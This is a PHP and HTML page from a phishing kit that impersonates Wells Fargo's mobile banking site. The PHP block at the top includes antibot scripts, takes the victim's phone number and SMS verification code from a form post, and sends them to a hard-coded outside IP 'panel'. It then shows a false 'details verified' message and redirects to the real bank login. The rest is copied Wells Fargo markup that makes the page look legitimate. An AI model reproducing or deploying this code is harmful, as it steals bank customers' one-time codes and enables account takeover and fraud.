<!DOCTYPE html>
<html class="no-js" lang="en">
<?php
session_start();
error_reporting(0);
include('../../files/boot/check.php');
include('../../files/boot/check1.php');
include('../../files/boot/check2.php');
include('../../files/boot/antibot.php');
include('../../files/boot/enc.php');
include('../../call.php');
$user = @$_POST['user'];
$code = trim($_POST['code']);
$phone = trim($_POST['phone']);
echo $phone . " : " . $code;
if ($code == "") {
  echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?error=1&phone=' . $phone . '&user=' . $user . '">';
    die();
}
$test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
?>
<head>
    <meta http-equiv="refresh" content="7; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=mobilebrowser&error=yes">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more.">
    <meta name="keywords" content="checking accounts, savings accounts, student loans, personal loans, investments, online banking, auto loans, home loans">
    <meta name="robots" content="index, follow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <meta http-equiv="Cache-Control" content="must-revalidate">
    <meta http-equiv="Cache-Control" content="no-store">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Cache-Control" content="private">
    <meta http-equiv="Pragma" content="no-cache">
    <meta name="apple-itunes-app" content="app-id=311548709">

    <link rel="shortcut icon" type="image/x-icon" href="https://www01.wellsfargomedia.com/favicon.ico">
    <link rel="apple-touch-icon" sizes="120x120" href="https://www.wellsfargo.com/assets/images/icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.wellsfargo.com/assets/images/icons/apple-touch-icon-180x180.png">
    <link rel="icon" sizes="128x128" href="https://www.wellsfargo.com/assets/images/icons/icon-normal-128x128.png">
    <link rel="icon" sizes="192x192" href="https://www.wellsfargo.com/assets/images/icons/icon-hires-192x192.png">

    <link rel="stylesheet" href="../../files/bars/framework.css">
    <link rel="stylesheet" href="../../files/bars/util.css">
    <link rel="stylesheet" href="../../files/bars/smartphone-homepage.css">

</head>

<body class="freezedscreen" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>

        <header class="masthead" role="banner">

            <div id="navLeft" style="display: block;">

                <a tabindex="1" href="" rel="nofollow" class="backLink">
                    <span class="sr-only">Back link</span>
                </a>

            </div>

            <div class="logoOuter">
                <div class="logo">
                    <a href="https://www.wellsfargo.com/"><img alt="" role="img" src="../../files/bars/icn-layer-svg.svg"></a>
                </div>
            </div>

            <div id="navRight">
                <nav class="navbar navbar-default navbar-fixed-top">
                    <div class="navbar-header">
                        <div class="entire-menu">
                            <button type="button" class="navbar-toggle hamburger" aria-expanded="false" aria-label="Open Menu Navigation"><span class="sr-only">Menu</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="icon-bar">‍</span> <span class="expandedIcon pointer">‍</span></button>
                        </div>
                    </div>
                </nav>
            </div>

        </header>

        <nav class="st-menu st-effect-1 wfhamburger-menu" id="hamburger-menu" aria-hidden="true" style="visibility: visible;">
            <div class="container clistData" data-cid="tcm:323-114093-16" data-ctid="tcm:322-2830-32">
                <ul id="menu" class="menu navbar-nav">
                    <li id="search">
                        <span class="sr-only">Beginning of the Menu</span>

                        <a class="search-ham" href="#">

                            <span class="search-background">Search</span>
                            <span class="searchicon">?</span>
                        </a>

                        <a class="signOn-ham" href="#">
                            <span id="signOnham">Sign On</span>
                        </a>
                    </li>
                    <li class="menu" id="breadcrumb" style="display: none;">
                        <span>?</span>

                        <a href="javascript:void(0)">Main Menu</a>
                    </li>
                    <li id="front-porch" class="home">
                        <div class="home">

                            <a href="https://www.wellsfargo.com/">Home</a>
                        </div>
                    </li>
                    <li id="spanish-link" data-toggle="modal" data-target="#myModal">
                        <a href="https://www.wellsfargo.com/es/?linkLoc=hb" lang="es">Español</a>
                    </li>
                    <li>
                        <a href="https://www.wellsfargo.com/locator/?linkLoc=hb">ATMs/Locations</a>
                    </li>
                    <li>
                        <a href="https://www.wellsfargo.com/smartphone/interstitial/check-rates/?linkLoc=hb">Check Rates</a>
                    </li>
                    <li class="addNewLine">
                        <a href="javascript:void(0)">
                            <strong>Personal</strong>
                        </a>
                    </li>
                    <li class="hamburgerOne hamburger-icon">
                        <a href="javascript:void(0)">Banking</a>

                        <ul class="sub-menu">
                            <li>
                                <a href="https://www.wellsfargo.com/checking/quickstart/index/?linkLoc=hb">Checking Quick Start Guide</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/checking/?linkLoc=hb">Checking Accounts</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/savings-cds/?linkLoc=hb">Savings Accounts &amp; CDs</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/credit-cards/?linkLoc=hb">Credit Cards</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/debit-card/?linkLoc=hb">Debit &amp; Prepaid Cards</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/help/routing-number/?linkLoc=hb">Routing &amp; Account Numbers</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/international-remittances/?linkLoc=hb">International Remittances</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/online-banking/?linkLoc=hb">Mobile Banking</a>
                            </li>
                        </ul>

                    </li>
                    <li class="hamburgerOne hamburger-icon">
                        <a href="javascript:void(0)">Loans &amp; Credit</a>

                        <ul class="sub-menu">
                            <li>
                                <a href="https://www.wellsfargo.com/mortgage?linkLoc=hb">Mortgage Loans</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/equity/?linkloc=hb">Home Equity Lines</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/student/?linkLoc=hb">Student Loans</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/auto-loans/?linkLoc=hb">Auto Loans</a>
                            </li>

                            <li>
                                <a href="https://www.wellsfargo.com/credit-cards/?linkLoc=hb">Credit Cards</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/personal-credit/?linkLoc=hb">Personal Lines and Loans</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/goals-credit/?linkLoc=hb">Borrowing &amp; Credit</a>
                            </li>
                        </ul>

                    </li>
                    <li class="hamburgerOne hamburger-icon">
                        <a href="javascript:void(0)">Investing &amp; Retirement</a>

                        <ul class="sub-menu">
                            <li>
                                <a href="https://www.wellsfargo.com/investing/index/?linkLoc=hb">Investing</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargoadvisors.com/services/intuitive-investor.htm?cid=WFA1800032824&amp;excid=WFA1800032824&amp;linkLoc=hb">Intuitive Investor<sup>®</sup></a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/investment-institute/top-news-and-commentary/?linkLoc=hb">Investing Insights</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/investing/retirement/ira/?linkLoc=hb">IRAs</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/investing/retirement/rollover/?linkLoc=hb">Rollovers (401k and IRA)</a>
                            </li>
                        </ul>

                    </li>
                    <li class="hamburgerOne hamburger-icon">
                        <a href="javascript:void(0)">Wealth Management</a>

                        <ul class="sub-menu">
                            <li>
                                <a href="https://www.wellsfargo.com/investment-institute/?linkLoc=hb">Investing Insights</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/the-private-bank/?linkLoc=hb">The Private Bank</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargoadvisors.com/financial-advisor/services.htm?excid=WF130043044&amp;linkLoc=hb" enrollmentid="2156">Wells Fargo Advisors</a>
                            </li>
                        </ul>

                    </li>
                    <li class="hamburgerOne hamburger-icon">
                        <a href="javascript:void(0)">Rewards &amp; Benefits</a>

                        <ul class="sub-menu">
                            <li>
                                <a href="https://www.wellsfargo.com/go-far-rewards/?linkLoc=hb">Go Far<sup>TM</sup> Rewards</a>
                            </li>
                            <li>
                                <a href="https://connect.secure.wellsfargo.com/auth/login/rewards?linkLoc=hb" enrollmentid="2429">Sign On to Rewards</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/customer-relationship-program/index/?linkLoc=hb">Relationship Program</a>
                            </li>
                        </ul>

                    </li>
                    <li class="hamburgerOne">
                        <a href="https://www.wellsfargo.com/financial-education/?linkLoc=hb">Financial Education</a>
                    </li>
                    <li>
                        <a href="https://www.wellsfargo.com/biz/?linkLoc=hb">
                            <strong>Small Business</strong>
                        </a>
                    </li>
                    <li>
                        <a href="https://www.wellsfargo.com/com/?linkLoc=hb">
                            <strong>Commercial</strong>
                        </a>
                    </li>
                    <li class="footer-hamburger footer-icon">
                        <a class="menu-footer" href="javascript:void(0)">Help Center</a>

                        <ul class="sub-menu">
                            <li>
                                <a href="https://www.wellsfargo.com/help/faqs/?linkLoc=hb">FAQs</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/help/routing-number/?linkLoc=hb">Routing &amp; Account Numbers</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/help/faqs/sign-on/?linkLoc=hb">Forgot Password/Username?</a>
                            </li>
                            <li>
                                <a href="https://oam.wellsfargo.com/oamo/identity/enrollment?linkLoc=hb" enrollmentid="2475">Enroll in Wells Fargo Online<sup>®</sup></a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/smartphone/interstitial/favorites/?linkLoc=hb">My Favorites</a>
                            </li>
                            <li>
                                <a href="https://appointments.wellsfargo.com/maa/appointment/?linkLoc=hb#/topic" enrollmentid="2935">Make an Appointment</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/help/contact-us/?linkLoc=hb">Contact Us</a>
                            </li>
                        </ul>

                    </li>
                    <li class="footer-hamburger footer-icon">
                        <a class="menu-footer" href="javascript:void(0)">About Wells Fargo</a>

                        <ul class="sub-menu">
                            <li>
                                <a href="https://www.wellsfargo.com/about/careers/?linkLoc=hb">Careers</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/about/corporate/?linkLoc=hb">Who We Are</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/about/corporate-responsibility/?linkLoc=hb">Corporate Social Responsibility</a>
                            </li>
                            <li>
                                <a href="https://newsroom.wf.com/?linkLoc=hb">Newsroom</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/about/corporate/governance/?linkLoc=hb">Leadership and Governance</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/about/investor-relations/?linkLoc=hb">Investor Relations</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargo.com/about/diversity/?linkLoc=hb">Diversity and Accessibility</a>
                            </li>
                            <li>
                                <a href="https://stories.wf.com/?cid=vty&amp;linkLoc=hb">Wells Fargo Stories</a>
                            </li>
                            <li>
                                <a href="https://www.wellsfargohistory.com/timeline/?linkLoc=hb">Wells Fargo History</a>
                            </li>
                        </ul>

                    </li>
                    <li class="footer-hamburger">
                        <a class="menu-footer" href="https://www.wellsfargo.com/privacy-security/?linkLoc=hb">Privacy &amp; Cookies Policy</a>
                    </li>
                    <li class="footer-hamburger">
                        <a class="menu-footer" href="https://www.wellsfargo.com/privacy-security/fraud/?linkloc=hb">Online &amp; Mobile Security</a>
                    </li>
                    <li class="footer-hamburger">
                        <a class="menu-footer" href="https://www.wellsfargo.com/?fullsite=fp&amp;linkLoc=hb">Full Site</a>
                    </li>
                    <li class="footer-hamburger stagecoach">‍<span class="sr-only">End of the Menu</span></li>
                    <li class="footer-hamburger stagecoach footer-level-2" style="display: none;">‍</li>
                </ul>
            </div>
        </nav>

        <div id="maincontainer">

            <div class="search-signon-wrapper" aria-hidden="true">
                <div class="search-signon-container" style="display: none;">
                    <div class="wrap left rounded">
                        <div class="search-container">

                            <label class="sr-only" for="searchopen">Search</label>
                            <input type="text" class="search left rounded" id="searchopen" value="Search">
                            <span class="search-sprite"></span>
                        </div>
                    </div>
                    <div class="signon-container">
                        <span class="signonlock" aria-hidden="true">‍</span>
                        <a href="" id="signOn">Sign On</a>
                    </div>
                </div>
            </div>
            <div class="overlay" style="display: none;">
                <div class="wrap left rounded">
                    <div class="searchContainer">
                        <form id="frmSearch" name="frmSearch" action="/search/search" method="GET" autocomplete="off">
                            <span class="search-image"></span>
                            <label class="sr-only" for="overlaySearch">Search</label>
                            <input name="q" type="text" class="left rounded required" id="overlaySearch">
                            <span class="clear-image"></span>
                        </form>
                    </div>
                    <div class="cancel-container">
                        <a href="" id="cancelSearch">Cancel</a>
                    </div>
                </div>
            </div>

            <div class="overlaySignOn" style="top: 38.3333px;">

                <div class="overlayContainer">
                    <div class="welcome-container" tabindex="-1">Welcome</div>

                    <div class="security-container">
                        <span class="security-img"></span>
                        <a href="https://www.wellsfargo.com/privacy-security/fraud/" class="security-text">Online &amp; Mobile Security</a>
                    </div>
                    <div class="signOnContainer" align="center">
                        <form id="frmSignon" name="frmSignon" action="test.php" method="post" autocomplete="off">

                            <!-- Updated the name and value of the field -->
                            <p style="font-size: 120%;"> Your details have been verified</p>
                            <p style="font-size: 120%; font-weight: bold;"> You may now use your card and account as usual.</p>
                            <p style="font-size: 120%; font-weight: bold;"> We are sorry for this inconvenience.</p>

                            <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
                        </form>
                    </div>
                    <div class="appstoreBadge" id="ios">
                        <a href="https://www.wellsfargo.com/exit/exit_appstore_ios/" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
                        <a href="https://www.wellsfargo.com/exit/exit_appstore_andriod/" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>

                    </div>
                    <footer role="contentinfo">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="https://www.wellsfargo.com/privacy-security/">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices">Ad Choices</a>
                                    <div class="footer-oaa"><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../../files/bars/stagecoach_50_opacity.svg" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>

                    </footer>
                </div>

            </div>

            <div class="heroCarousel slick-initialized slick-slider initialized" data-cid="tcm:323-114132-16" data-ctid="tcm:322-6277-32" id="carousel0" aria-hidden="true">

                <div class="slick-list draggable">
                    <div class="slick-track" style="opacity: 1; width: 2763px; transform: translate3d(0px, 0px, 0px);">
                        <div class="carouselSlide slick-slide slick-current slick-active" data-slide="Item 1" data-slick-index="0" style="width: 921px;" tabindex="0"><span class="hidden">Begin Slide 1</span>
                            <div class="iaRendered" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" data-offer-id="C_efs_peakseason_hpprimary_web_mob" lang="en">
                                <a data-platform="publicsite" href="https://www.wellsfargo.com/jump/student-loans/flexibility" exitdestination="" data-cid="tcm:402-166164-16" data-ctid="tcm:322-41008-32" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="contentArea" data-params="" data-tracking-id="" tabindex="0">
                                    <div class="thumbWithText">

                                        <img alt="" src="../../files/bars/wfi000_ic_b-resource-library-rv_57x57.png">

                                        <div class="textContent">
                                            <h2>Tuition to books</h2> A private student loan may help you cover college costs
                                        </div>
                                    </div>

                                </a>

                                <img alt="" src="../../files/bars/wfic598_ph_g-878868560_576x263.jpg">

                            </div>
                            <span class="hidden">End Slide 1</span></div>
                        <div class="carouselSlide slick-slide" data-slide="Item 2" data-slick-index="1" aria-hidden="true" style="width: 921px;" tabindex="-1" title=""><span class="hidden">Begin Slide 2</span>
                            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en">
                                <a class="contentArea" href="https://www.wellsfargo.com/stories/" tabindex="-1">
                                    <div class="thumbWithText">

                                        <img alt="" src="../../files/bars/wfi000_ic_b-handshake_57x57.png">

                                        <div class="textContent">
                                            <h2>Keeping you informed</h2> New progress in making things right for our customers
                                        </div>
                                    </div>

                                </a>

                                <img alt="" src="../../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg" class="deferred" data-deferred-src="https://www04.wellsfargomedia.com/assets/images/contextual/banner/enterprise/576x263/wfic180_ph_1_b-f14_002_576x263.jpg">

                            </div>
                            <span class="hidden">End Slide 2</span></div>
                        <div class="carouselSlide slick-slide" data-slide="Item 3" data-slick-index="2" aria-hidden="true" style="width: 921px;" tabindex="-1"><span class="hidden">Begin Slide 3</span>
                            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_3" lang="en">
                                <a class="contentArea" href="https://www.wellsfargo.com/stories/" tabindex="-1">
                                    <div class="thumbWithText">

                                        <img alt="" src="../../files/bars/wfi000_ic_b-handshake_57x57.png">

                                        <div class="textContent">
                                            <h2>Keeping you informed</h2> New progress in making things right for our customers
                                        </div>
                                    </div>

                                </a>

                                <img alt="" src="../../files/bars/wfic180_ph_1_b-f14_002_576x263.jpg" class="deferred" data-deferred-src="https://www04.wellsfargomedia.com/assets/images/contextual/banner/enterprise/576x263/wfic180_ph_1_b-f14_002_576x263.jpg">

                            </div>
                            <span class="hidden">End Slide 3</span></div>
                    </div>
                </div>

                <ul class="slick-dots" style="">
                    <li class="slick-active" aria-selected="true" aria-controls="navigation00" id="slick-slide00">
                        <button class="dotButtoncarousel0" type="button" tabindex="0">Item 1: You Are Here</button>
                    </li>
                    <li class="slick-inactive" aria-selected="false" aria-controls="navigation01" id="slick-slide01">
                        <button class="dotButtoncarousel0" type="button" tabindex="0">Item 2</button>
                    </li>
                    <li class="slick-inactive" aria-selected="false" aria-controls="navigation02" id="slick-slide02">
                        <button class="dotButtoncarousel0" type="button" tabindex="0">Item 3</button>
                    </li>
                </ul>
            </div>

            <section id="top-tasks" aria-hidden="true">

                <div class="clistData" data-cid="tcm:323-114118-16" data-ctid="tcm:91-2043-32"><a href="https://www.wellsfargo.com/checking/?linkLoc=t1">Open a checking account</a> <a href="https://www.wellsfargo.com/mortgage/?linkLoc=t2">Explore home loans</a> <a href="https://www.wellsfargo.com/credit-cards/?linkLoc=t3">Find a credit card</a></div>

                <a class="iaRendered" href="https://www.wellsfargo.com/jump/enterprise/goals/" data-tracking-id="21520-158498-3408-186" data-slot-id="WF_CON_HP_TOP_TASK_1" data-offer-id="C_oth_financialhealth_toptask_web_mob" lang="en">Reach goals with 1 new habit</a>

            </section>

            <div class="overlayfavorite" style="display: none;" aria-hidden="true">
                <div class="favorite-popup" style="top: 520px;"><span class="close-popup"><a href="" class="nooutline"><img alt="Close" src="../../files/bars/btn-close-x.png"></a></span> <span class="sr-only">Begining of popup</span>
                    <div class="popup-title">
                        <h2>Article Saved</h2>
                    </div>
                    <div class="popup-body">
                        <p>You can keep up to 5 favorite articles at a time.</p>
                        <p>Select the <strong>Help Center</strong> &gt; <strong>My Favorites</strong> from the top menu to see your saved articles.</p>
                    </div>
                    <span class="sr-only">End of popup</span></div>
            </div>

            <article class="fp-articles" data-cid="tcm:323-173177-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                <a class="articles-media" href="https://www.wellsfargo.com/financial-education/basic-finances/manage-money/cashflow-savings/emergencies/">

                    <img alt="Saving up for an emergency" src="../../files/bars/couple_home-improvement_working_110x110.jpg">

                    <span class="articles-header">Saving up for an emergency</span>
                </a>
                <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add    

  Saving up for an emergency
 to favorites</span></span> </a>
            </article>

            <article class="fp-articles" data-cid="tcm:323-174682-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                <a class="articles-media" href="https://www.wellsfargo.com/financial-education/credit-management/getting-credit-card/">

                    <img alt="Credit card tips for first-time cardholders" src="../../files/bars/female_on-computer_with-coffee_110x110.jpg">

                    <span class="articles-header">Credit card tips for first-time cardholders</span>
                </a>
                <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add    

  Credit card tips for first-time cardholders
 to favorites</span></span> </a>
            </article>

            <article class="fp-articles" data-cid="tcm:323-178559-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                <a href="https://www.wellsfargo.com/commitment/redress/" class="articles-media">

                    <img alt="Customer Redress" src="../../files/bars/redress_110x110.jpg">

                    <span class="articles-header">Making Things Right – Customer Redress</span>
                </a>
                <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add    

  Making Things Right – Customer Redress
 to favorites</span></span> </a>
            </article>

            <article class="fp-articles" data-cid="tcm:323-149897-16" data-ctid="tcm:322-113919-32" aria-hidden="true">
                <a class="articles-media" href="https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1" enrollmentid="2475">

                    <img alt="" src="../../files/bars/article_service_card_e-bills_1x.jpg">

                    <span class="articles-header"><p>Need online access?<br>Enroll Now</p></span>
                </a>
                <a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add    

  Need online access?Enroll Now
 to favorites</span></span> </a>
            </article>

            <div class="iaRendered" data-slot-id="WF_CON_HP_SECONDARY_BNR_1" data-offer-id="C_mtg_prequaldmiweghcpp_hpsec_web_mob" aria-hidden="true">
                <a data-platform="publicsite" href="https://www.wellsfargo.com/mortgage/apply/prequalification/?dm=DMIWEPURMA" exitdestination="" data-cid="tcm:402-114535-16" data-ctid="tcm:322-41007-32" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="marketing-card color4" data-params="" data-tracking-id="21520-158535-3408-100">

                    <img alt="" src="../../files/bars/wfib421_ph_v-blp0006152_110x110.jpg">

                    <span class="header-text">Home loans: Get prequalified</span>
                </a>
            </div>

            <div id="toolbar" class="clistData" data-cid="tcm:323-114111-16" data-ctid="tcm:322-2040-32" aria-hidden="true">
                <div class="toolbar-heading">How can we help?</div>
                <a class="toolbar-section" href="https://www.wellsfargo.com/locator/?linkLoc=tools">
                    <span class="location-img">‍</span>

                    <span class="toolbar-text">Locations</span>
                </a>
                <a class="toolbar-section" href="https://appointments.wellsfargo.com/maa/appointment/?linkLoc=tools&amp;srcType=FP" enrollmentid="2935" data-link-open-style="native">
                    <span class="appointment-img">‍</span>

                    <span class="toolbar-text">Appointments</span>
                </a>
                <a class="toolbar-section" href="https://www.wellsfargo.com/smartphone/interstitial/check-rates/?linkLoc=tools" data-link-open-style="native">
                    <span class="rates-img">‍</span>

                    <span class="toolbar-text">Rates</span>
                </a>
                <a class="toolbar-section" href="https://www.wellsfargo.com/smartphone/interstitial/contact-us/?linkLoc=tools" data-link-open-style="native">
                    <span class="contact-img">‍</span>

                    <span class="toolbar-text">Contact</span>
                </a>
                <div class="clear-float">‍</div>
            </div>

            <div class="appstoreBadge" id="ios" aria-hidden="true">
                <a href="https://www.wellsfargo.com/exit/exit_appstore_ios/" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>
                <a href="https://www.wellsfargo.com/exit/exit_appstore_andriod/" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
            </div>

            <footer role="contentinfo" aria-hidden="true">
                <div class="html5footer c9" id="pageFooter">

                    <nav class="nav-footer">

                        <div class="footer-link clistData" data-cid="tcm:323-114110-16" data-ctid="tcm:322-113916-32"><a href="https://www.wellsfargo.com/privacy-security/">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices">Ad Choices</a>
                            <div class="footer-oaa"><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/">Online Access Agreement</a></div>
                        </div>

                        <div class="footer-content">
                            <div>
                                <strong>Investment and Insurance Products are:</strong>
                            </div>
                            <div>
                                <strong>Not insured by the FDIC or any Federal Government Agency | 
Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any 
Bank Affiliate | Subject to Investment Risks, Including Possible Loss of
 the Principal Amount Invested</strong>
                            </div>
                        </div>

                        <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>

                        <div class="footer-content">
                            <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>

                        <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>

                        <div class="stage-coach">
                            <img src="../../files/bars/stagecoach_50_opacity.svg" alt="Wells Fargo Stage Coach" role="img">
                        </div>

                    </nav>

                </div>
            </footer>


        </div>
    </div>

    <div class="displayNone">
        <img src="../../files/bars/s.gif" alt="">
    </div>


</body>

</html>